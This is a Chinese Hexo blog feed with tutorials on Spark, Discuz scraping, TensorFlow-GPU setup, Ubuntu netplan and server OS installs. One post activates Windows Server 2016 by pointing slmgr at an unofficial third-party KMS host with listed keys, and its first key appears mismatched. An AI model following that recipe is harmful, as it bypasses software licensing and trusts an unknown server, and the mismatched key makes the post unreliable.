<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>浩翰Redamancy的博客</title>
  
  <subtitle>文质彬彬 然后君子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://plutoacharon.github.io/"/>
  <updated>2019-11-28T09:39:58.020Z</updated>
  <id>https://plutoacharon.github.io/</id>
  
  <author>
    <name>浩翰</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Spark Shell操作</title>
    <link href="https://plutoacharon.github.io/2019/11/28/Spark-Shell%E6%93%8D%E4%BD%9C/"/>
    <id>https://plutoacharon.github.io/2019/11/28/Spark-Shell操作/</id>
    <published>2019-11-28T09:39:32.000Z</published>
    <updated>2019-11-28T09:39:58.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Spark-简介"><a href="#Spark-简介" class="headerlink" title="Spark 简介"></a>Spark 简介</h2><p>Spark shell是一个特别适合快速开发Spark程序的工具。即使你对Scala不熟悉，仍然可以使用这个工具快速应用Scala操作Spark。</p><p>Spark shell使得用户可以和Spark集群交互，提交查询，这便于调试，也便于初学者使用Spark。</p><p>Spark shell是非常方便的，因为它很大程度上基于Scala REPL(Scala交互式shell，即Scala解释器)，并继承了Scala REPL(读取-求值-打印-循环)(Read-Evaluate-Print-Loop)的所有功能。运行spark-shell，则会运行spark-submit，spark-shell其实是对spark-submit的一层封装。</p><p>下面是Spark shell的运行原理图<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci8yMDVkMTIxYS05MWFkLTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nLzAxLnBuZw?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><h3 id="RDD"><a href="#RDD" class="headerlink" title="RDD"></a>RDD</h3><p>RDD有两种类型的操作 ，分别是Transformation（返回一个新的RDD）和Action（返回values）。</p><p>1.Transformation：根据已有RDD创建新的RDD数据集build</p><p>（1）map(func)：对调用map的RDD数据集中的每个element都使用func，然后返回一个新的RDD，这个返回的数据集是分布式的数据集。</p><p>（2）filter(func) ：对调用filter的RDD数据集中的每个元素都使用func，然后返回一个包含使func为true的元素构成的RDD。</p><p>（3）flatMap(func)：和map很像，但是flatMap生成的是多个结果。</p><p>（4）mapPartitions(func)：和map很像，但是map是每个element，而mapPartitions是每个partition。</p><p>（5）mapPartitionsWithSplit(func)：和mapPartitions很像，但是func作用的是其中一个split上，所以func中应该有index。</p><p>（6）sample(withReplacement,faction,seed)：抽样。</p><p>（7）union(otherDataset)：返回一个新的dataset，包含源dataset和给定dataset的元素的集合。</p><p>（8）distinct([numTasks])：返回一个新的dataset，这个dataset含有的是源dataset中的distinct的element。</p><p>（9）groupByKey(numTasks)：返回(K,Seq[V])，也就是Hadoop中reduce函数接受的key-valuelist。</p><p>（10）reduceByKey(func,[numTasks])：就是用一个给定的reduce func再作用在groupByKey产生的(K,Seq[V])，比如求和，求平均数。</p><p>（11）sortByKey([ascending],[numTasks])：按照key来进行排序，是升序还是降序，ascending是boolean类型。</p><h3 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h3><p>Action：在RDD数据集运行计算后，返回一个值或者将结果写入外部存储</p><p>（1）reduce(func)：就是聚集，但是传入的函数是两个参数输入返回一个值，这个函数必须是满足交换律和结合律的。</p><p>（2）collect()：一般在filter或者足够小的结果的时候，再用collect封装返回一个数组。</p><p>（3）count()：返回的是dataset中的element的个数。</p><p>（4）first()：返回的是dataset中的第一个元素。</p><p>（5）take(n)：返回前n个elements。</p><p>（6）takeSample(withReplacement，num，seed)：抽样返回一个dataset中的num个元素，随机种子seed。</p><p>（7）saveAsTextFile（path）：把dataset写到一个textfile中，或者HDFS，或者HDFS支持的文件系统中，Spark把每条记录都转换为一行记录，然后写到file中。</p><p>（8）saveAsSequenceFile(path)：只能用在key-value对上，然后生成SequenceFile写到本地或者Hadoop文件系统。</p><p>（9）countByKey()：返回的是key对应的个数的一个map，作用于一个RDD。</p><p>（10）foreach(func)：对dataset中的每个元素都使用func。</p><h3 id="数据说明"><a href="#数据说明" class="headerlink" title="数据说明"></a>数据说明</h3><p>某电商网站记录了大量的用户对商品的收藏数据，并将数据存储在名为buyer_favorite的文本文件中。文本数据格式如下：</p><pre><code>用户id（buyer_id），商品id（goods_id），收藏日期（dt）用户id   商品id    收藏日期  10181   1000481   2010-04-04 16:54:31  20001   1001597   2010-04-07 15:07:52  20001   1001560   2010-04-07 15:08:27  20042   1001368   2010-04-08 08:20:30  20067   1002061   2010-04-08 16:45:33  20056   1003289   2010-04-12 10:50:55  20056   1003290   2010-04-12 11:57:35  20056   1003292   2010-04-12 12:05:29  20054   1002420   2010-04-14 15:24:12  20055   1001679   2010-04-14 19:46:04  20054   1010675   2010-04-14 15:23:53  20054   1002429   2010-04-14 17:52:45  20076   1002427   2010-04-14 19:35:39  20054   1003326   2010-04-20 12:54:44  20056   1002420   2010-04-15 11:24:49  20064   1002422   2010-04-15 11:35:54  20056   1003066   2010-04-15 11:43:01  20056   1003055   2010-04-15 11:43:06  20056   1010183   2010-04-15 11:45:24  20056   1002422   2010-04-15 11:45:49  20056   1003100   2010-04-15 11:45:54  20056   1003094   2010-04-15 11:45:57  20056   1003064   2010-04-15 11:46:04  20056   1010178   2010-04-15 16:15:20  20076   1003101   2010-04-15 16:37:27  20076   1003103   2010-04-15 16:37:05  20076   1003100   2010-04-15 16:37:18  20076   1003066   2010-04-15 16:37:31  20054   1003103   2010-04-15 16:40:14  20054   1003100   2010-04-15 16:40:16  </code></pre><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>打开hadoop与spark集群,在命令行输入<code>spark-shell</code>打开sparkshell模式<br>将数据上传到hdfs中<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hadoop fs -mkdir -p /myspark3/wordcount  </span><br><span class="line">hadoop fs -put /data/spark3/wordcount/buyer_favorite /myspark3/wordcount</span><br></pre></td></tr></table></figure></p><h2 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h2><blockquote><p>要求统计用户收藏数据中，每个用户收藏商品数量<br>编写Scala语句，统计用户收藏数据中，每个用户收藏商品数量。</p></blockquote><p>先在spark-shell中，加载数据。<br><code>val rdd = sc.textFile(&quot;hdfs://localhost:9000/myspark3/wordcount/buyer_favorite&quot;);</code><br>执行统计并输出。<br><code>rdd.map(line=&gt; (line.split(&#39;\t&#39;)(0),1)).reduceByKey(_+_).collect</code><br><img src="https://img-blog.csdnimg.cn/2019112711495749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>sc是在进入spark shell 时候创建一个spark content  就是spark上下文的意思，val 是scala语法中声明常量的方式，通过println我们可以看到读入的文件被处理成一个MappedRDD的对象 mapred相信学过hadoop的人都不会陌生，RDD是Resilient Distributed Datasets，是一种弹性分布式数据集。</p><h3 id="关于reduceByKey"><a href="#关于reduceByKey" class="headerlink" title="关于reduceByKey"></a>关于reduceByKey</h3><pre><code>reduceByKey(_ ++ _) is equivalent to reduceByKey((x,y)=&gt; x ++ y) reduceByKey takes two parameters, apply a function and returnsAt the first it crates a set and ++ just adds collections together, combining elements of both sets.For each key It keeps appending in the list. In your case of 1 as a key x will be List(2,3) and y will List (3,4) and ++ will add both as List (2,3,3,4)If you had another value like (1,4,5) then the x would be List(4,5) in this case and y should be List (2,3,3,4) and result would be List(2,3,3,4,4,5)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Spark-简介&quot;&gt;&lt;a href=&quot;#Spark-简介&quot; class=&quot;headerlink&quot; title=&quot;Spark 简介&quot;&gt;&lt;/a&gt;Spark 简介&lt;/h2&gt;&lt;p&gt;Spark shell是一个特别适合快速开发Spark程序的工具。即使你对Scala不熟悉，
      
    
    </summary>
    
      <category term="Spark" scheme="https://plutoacharon.github.io/categories/Spark/"/>
    
    
      <category term="Spark" scheme="https://plutoacharon.github.io/tags/Spark/"/>
    
  </entry>
  
  <entry>
    <title>使用etree与xpath爬取Discuz论坛</title>
    <link href="https://plutoacharon.github.io/2019/11/28/%E4%BD%BF%E7%94%A8etree%E4%B8%8Expath%E7%88%AC%E5%8F%96Discuz%E8%AE%BA%E5%9D%9B/"/>
    <id>https://plutoacharon.github.io/2019/11/28/使用etree与xpath爬取Discuz论坛/</id>
    <published>2019-11-28T09:38:36.000Z</published>
    <updated>2019-11-28T09:39:13.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引入模块"><a href="#引入模块" class="headerlink" title="引入模块"></a>引入模块</h2><p>在pycharm中下载lxml库<br>通过<code>from lxml import etree</code>引入模块</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">url = <span class="string">"https://www.discuz.net/forum-developer-1.html"</span></span><br><span class="line">text = requests.get(url).text</span><br><span class="line">html = etree.HTML(text)</span><br><span class="line">context = etree.tostring(html).decode()</span><br><span class="line">print(html.xpath(<span class="string">'//div[@id="threadlist"]/div[2]/form/table/*'</span>))</span><br><span class="line">print(html.xpath(<span class="string">'//*[@id="threadlisttableid"]/*'</span>))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191121113442809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191121113510851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里是通过xpath语法将论坛的所有<code>tbody</code>便签<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(html.xpath(<span class="string">'//tbody/tr/th/a[@class="s xst"]/text()'</span>))</span><br></pre></td></tr></table></figure></p><p><img src="https://img-blog.csdnimg.cn/20191121132004384.png" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;引入模块&quot;&gt;&lt;a href=&quot;#引入模块&quot; class=&quot;headerlink&quot; title=&quot;引入模块&quot;&gt;&lt;/a&gt;引入模块&lt;/h2&gt;&lt;p&gt;在pycharm中下载lxml库&lt;br&gt;通过&lt;code&gt;from lxml import etree&lt;/code&gt;引入模块&lt;
      
    
    </summary>
    
      <category term="Python" scheme="https://plutoacharon.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://plutoacharon.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>WindowsServer2016 Anaconda下TensorFlow-GPU环境搭建详细教程（包含CUDA+cuDNN安装过程）</title>
    <link href="https://plutoacharon.github.io/2019/11/28/WindowsServer2016-Anaconda%E4%B8%8BTensorFlow-GPU%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B%EF%BC%88%E5%8C%85%E5%90%ABCUDA-cuDNN%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%EF%BC%89/"/>
    <id>https://plutoacharon.github.io/2019/11/28/WindowsServer2016-Anaconda下TensorFlow-GPU环境搭建详细教程（包含CUDA-cuDNN安装过程）/</id>
    <published>2019-11-28T09:37:25.000Z</published>
    <updated>2019-11-28T09:37:43.189Z</updated>
    
    <content type="html"><![CDATA[<p>记一次为GPU服务器搭建机器学习平台的操作</p><h2 id="安装Anaconda"><a href="#安装Anaconda" class="headerlink" title="安装Anaconda"></a>安装Anaconda</h2><p>去官网安装Anaconda</p><p>添加环境变量以后,创建TensorFlow环境<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTE5MjY5OS8yMDE4MDcvMTE5MjY5OS0yMDE4MDcwNTExNTAwMTgyMy0xNzkwNTQxMzc0LnBuZw?x-oss-process=image/format,png" alt><br>将以下三个路径加入，注意这里要换成你自己的安装路径。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xxx\anaconda3</span><br><span class="line">C:\Users\xxx\anaconda3\Scripts</span><br><span class="line">C:\Users\xxx\anaconda3\Library\bin</span><br></pre></td></tr></table></figure></p><p><img src="https://img-blog.csdnimg.cn/20191112204305572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="安装gpu版本的TensorFlow"><a href="#安装gpu版本的TensorFlow" class="headerlink" title="安装gpu版本的TensorFlow"></a>安装gpu版本的TensorFlow</h2><p>激活TensorFlow环境<br><code>activate tensorflow</code></p><blockquote><p>注意: 如果出现报错先运行<code>conda init</code>初始化,关闭cmd重新打开即可运行</p></blockquote><p><code>pip install tensorflow-gpu==1.10.0 -i https://pypi.tuna.tsinghua.edu.cn/simple</code><br>这样就安装成功了。<br><img src="https://img-blog.csdnimg.cn/20191116152559217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意：务必注意一点，在安装完tensroflow后，由于我们是新创建的conda环境，该环境中基本上是空的，有很多包和IDE并没有安装进来，例如“Ipython”，“spyder”此时如果我们在该环境下打开spyder/Ipyton/jupyter notebook等，会发现其实IDE使用的kernel并不是新建立的这个环境的kernel，而是“base”这个环境的，而“base”环境中我们并没有安装tensorflow，所以一定无法import。这也就是为什么有很多人在安装好tensorflow后仍然在IDE里无法正常使用的原因了。</p><h3 id="安装anaconda基础环境"><a href="#安装anaconda基础环境" class="headerlink" title="安装anaconda基础环境:"></a>安装anaconda基础环境:</h3><p><code>conda install anaconda</code></p><h2 id="安装CUDA-Toolkit-cuDNN"><a href="#安装CUDA-Toolkit-cuDNN" class="headerlink" title="安装CUDA Toolkit + cuDNN"></a>安装CUDA Toolkit + cuDNN</h2><p>查看需要安装的CUDA+cuDNN版本<br>注意，tensorflow是在持续更新的，具体安装的CUDA和cuDNN版本需要去官网查看，要与最新版本的tensorflow匹配。</p><p>点击查看最新tensorflow支持的CUDA版本：<a href="https://www.tensorflow.org/install/install_windows#requirements_to_run_tensorflow_with_gpu_support" target="_blank" rel="noopener">https://www.tensorflow.org/install/install_windows#requirements_to_run_tensorflow_with_gpu_support</a></p><p>我这里安装的是<br><img src="https://img-blog.csdnimg.cn/20191116152410895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191116152208322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载之后，双击CUDA9.0，一路戳戳戳。</p><h3 id="CuDNN"><a href="#CuDNN" class="headerlink" title="CuDNN"></a>CuDNN</h3><p>进入 <a href="https://developer.nvidia.com/rdp/cudnn-archive" target="_blank" rel="noopener">https://developer.nvidia.com/rdp/cudnn-archive</a> ，选择对应的7.0版本下载即可。</p><p>将cuDNN解压。将解压出来的三个文件夹下面的文件放到对应的CUDA相同文件夹下<br><img src="https://img-blog.csdnimg.cn/20191116153101913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>CUDA默认安装路径：C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0</p><p>以上完成之后把以下四个路径加入到环境变量中：</p><pre><code>C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0\binC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0\libnvvpC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0\libC:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9.0\include</code></pre><p><img src="https://img-blog.csdnimg.cn/20191116153320743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置完环境变量后,输入<code>nvcc -V</code><br><img src="https://img-blog.csdnimg.cn/20191116154644569.png" alt="在这里插入图片描述"><br>成功!</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>如下图所示:<br><code>/device:GPU:0</code>即调用了GPU<br>如果返回为空,就是<code>only CPU</code><br><img src="https://img-blog.csdnimg.cn/20191116160245926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考网站:</p><p><code>https://www.cnblogs.com/guoyaohua/p/9265268.html#%E7%AC%AC%E4%BA%8C%E6%AD%A5%E5%AE%89%E8%A3%85tensorflow-gpu</code></p><p><code>https://zhuanlan.zhihu.com/p/37157215</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记一次为GPU服务器搭建机器学习平台的操作&lt;/p&gt;
&lt;h2 id=&quot;安装Anaconda&quot;&gt;&lt;a href=&quot;#安装Anaconda&quot; class=&quot;headerlink&quot; title=&quot;安装Anaconda&quot;&gt;&lt;/a&gt;安装Anaconda&lt;/h2&gt;&lt;p&gt;去官网安装Anac
      
    
    </summary>
    
      <category term="机器学习" scheme="https://plutoacharon.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="机器学习" scheme="https://plutoacharon.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>WindowsServer 2016 最新激活方法</title>
    <link href="https://plutoacharon.github.io/2019/11/28/WindowsServer-2016-%E6%9C%80%E6%96%B0%E6%BF%80%E6%B4%BB%E6%96%B9%E6%B3%95/"/>
    <id>https://plutoacharon.github.io/2019/11/28/WindowsServer-2016-最新激活方法/</id>
    <published>2019-11-28T09:36:32.000Z</published>
    <updated>2019-11-28T09:36:48.988Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令行操作"><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h2><p>用管理员身份打开<code>Powershall</code>,输入:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">slmgr.vbs -ipk W269N-WFGWX-YVC9B-4J6C9-T83GX</span><br><span class="line">slmgr.vbs -skms kms.srv.crsoo.com</span><br><span class="line">slmgr.vbs -ato</span><br></pre></td></tr></table></figure></p><h2 id="输入要激活的系统秘钥"><a href="#输入要激活的系统秘钥" class="headerlink" title="输入要激活的系统秘钥"></a>输入要激活的系统秘钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2016</span><br><span class="line">| Operating system edition | KMS Client Setup Key | | —————————————– | —————————– | | Windows Server 2016 Datacenter | CB7KF-BWN84-R7R2Y-793K2-8XDDG | | Windows Server 2016 Standard | WC2BQ-8NRM3-FDDYY-2BFGV-KHKQY | | Windows Server 2016 Essentials | JCKRF-N37P4-C2D82-9YXRT-4M63B |</span><br></pre></td></tr></table></figure><p>笔者这里是标准版:<br><code>Windows Server 2016 Standard | WC2BQ-8NRM3-FDDYY-2BFGV-KHKQY</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;命令行操作&quot;&gt;&lt;a href=&quot;#命令行操作&quot; class=&quot;headerlink&quot; title=&quot;命令行操作&quot;&gt;&lt;/a&gt;命令行操作&lt;/h2&gt;&lt;p&gt;用管理员身份打开&lt;code&gt;Powershall&lt;/code&gt;,输入:&lt;br&gt;&lt;figure class=&quot;high
      
    
    </summary>
    
      <category term="其他" scheme="https://plutoacharon.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu 18.04.2 LTS网络设置</title>
    <link href="https://plutoacharon.github.io/2019/11/28/Ubuntu-18-04-2-LTS%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/"/>
    <id>https://plutoacharon.github.io/2019/11/28/Ubuntu-18-04-2-LTS网络设置/</id>
    <published>2019-11-28T09:35:37.000Z</published>
    <updated>2019-11-28T09:36:09.369Z</updated>
    
    <content type="html"><![CDATA[<h2 id="与Ubuntu16的对比"><a href="#与Ubuntu16的对比" class="headerlink" title="与Ubuntu16的对比"></a>与Ubuntu16的对比</h2><p>ubuntu16.04TLS的网络配置文件为/etc/network/interfaces，我们通过在该文件中写入配置对网卡进行IP设置。并且然后通过网卡的重启来加载该配置</p><p>ubuntu18.04TLS中，其引入了一个新的工具netplan来进行网络设备的管理，对其进行设置。</p><p>netplan的配置文件位于/etc/netplan文件夹下面</p><h2 id="对Ubuntu-18-04的网络配置"><a href="#对Ubuntu-18-04的网络配置" class="headerlink" title="对Ubuntu 18.04的网络配置"></a>对Ubuntu 18.04的网络配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cuda@cuda1:~$ <span class="built_in">cd</span> /etc/netplan/</span><br><span class="line">cuda@cuda1:/etc/netplan$ ls</span><br><span class="line">50-cloud-init.yaml</span><br><span class="line">cuda@cuda1:/etc/netplan$</span><br></pre></td></tr></table></figure><p>可以看到在<code>/etc/netplan</code>下有个yaml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cuda@cuda1:~$ cat /etc/netplan/50-cloud-init.yaml </span><br><span class="line"><span class="comment"># This file is generated from information provided by</span></span><br><span class="line"><span class="comment"># the datasource.  Changes to it will not persist across an instance.</span></span><br><span class="line"><span class="comment"># To disable cloud-init's network configuration capabilities, write a file</span></span><br><span class="line"><span class="comment"># /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:</span></span><br><span class="line"><span class="comment"># network: &#123;config: disabled&#125;</span></span><br><span class="line">network:</span><br><span class="line">    ethernets: <span class="comment">#配置的网卡名称,使用ifconfig -a查看得到,且必须是空格缩进，netplan只认空格</span></span><br><span class="line">        eno1:</span><br><span class="line">            addresses: []</span><br><span class="line">            </span><br><span class="line">            dhcp4: <span class="literal">true</span> dhcp4开启</span><br><span class="line">            optional: <span class="literal">true</span></span><br><span class="line">        eno2:</span><br><span class="line">            addresses: []</span><br><span class="line">              </span><br><span class="line">            dhcp4: <span class="literal">true</span></span><br><span class="line">            optional: <span class="literal">true</span></span><br><span class="line">    version: 2</span><br></pre></td></tr></table></figure><p>如果没有*.yaml后缀的文件，就运行如下命令创建一个（netplan会读取该目录下所有该后缀的文件）：</p><p><code>sudo netplan generate</code></p><h3 id="netplan"><a href="#netplan" class="headerlink" title="netplan"></a>netplan</h3><p>这里我开启了两张网卡</p><p>通过netplan更新配置</p><p><code>sudo netplan apply</code></p><p>通过ifconfig查看配置是否生效</p><p><code>ifconfig</code></p><p><img src="https://img-blog.csdnimg.cn/20191110104837846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>分配成功</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;与Ubuntu16的对比&quot;&gt;&lt;a href=&quot;#与Ubuntu16的对比&quot; class=&quot;headerlink&quot; title=&quot;与Ubuntu16的对比&quot;&gt;&lt;/a&gt;与Ubuntu16的对比&lt;/h2&gt;&lt;p&gt;ubuntu16.04TLS的网络配置文件为/etc/net
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>华为服务器H22H-03的Windows Server2012安装</title>
    <link href="https://plutoacharon.github.io/2019/11/28/%E5%8D%8E%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%99%A8H22H-03%E7%9A%84Windows-Server2012%E5%AE%89%E8%A3%85/"/>
    <id>https://plutoacharon.github.io/2019/11/28/华为服务器H22H-03的Windows-Server2012安装/</id>
    <published>2019-11-28T09:34:13.000Z</published>
    <updated>2019-11-28T09:34:55.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>镜像可以从<code>MSDN</code>中下载</p><p>使用软碟通制作一个Windows Server2012的U盘启动器</p><h3 id="设置BIOS把USB设置第一启动"><a href="#设置BIOS把USB设置第一启动" class="headerlink" title="设置BIOS把USB设置第一启动"></a>设置BIOS把USB设置第一启动</h3><p>重启服务器,在启动页面的时候多按几次del键</p><p>华为服务器默认密码<code>Huawei12@#</code></p><p>设置第一启动项为USB设备</p><p>在“UEFI”或“Boot Device Priority”界面中选择“Others”并按“Enter”。</p><p>通过“F5”、“F6”将USB设备调整到列表的第一行</p><p>或者按’+’ -‘号将other选项调整到第一行</p><p>保存重新启动</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wLnBzdGF0cC5jb20vb3JpZ2luL2ZlNzQwMDAwOGQ4ZWQxY2I4ZjMx?x-oss-process=image/format,png" alt></p><p><img src="https://img-blog.csdnimg.cn/20191110103844318.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="安装WindowsServer"><a href="#安装WindowsServer" class="headerlink" title="安装WindowsServer"></a>安装WindowsServer</h2><p>如果安装windows server 2008r2/2012r2时提示：无法在此驱动器上安装windows:</p><pre><code>因为服务器出厂一般默认都是bios引导，当你合并vd(虚拟磁盘)后，改用UEFI引导安装windows时会出现此错误，此时你可以使用“shift+F10”快捷键打开命令行窗口，执行以下命令清除之前BIOS引导时磁盘分区残留信息，命令如下：1:diskpart(启动diskpart程序)2:list disk(列出现有的磁盘，一般合并后为一个disk0)3:select disk 0(这里根据实际情况选择你要清除残留信息的磁盘)4:clean(清除所选磁盘的残留信息，注意所有的数据也将丢失)*特别注意：在做此操作前，有重要数据的一定要备份，此操作会将全盘格式化</code></pre><p>秘钥: <code>NB4WH-BBBYV-3MPPC-9RCMV-46XCB</code></p><blockquote><p>我这里安装的是标准版</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2019111010390951.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191110103919785.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191110103928563.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDQyNTI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
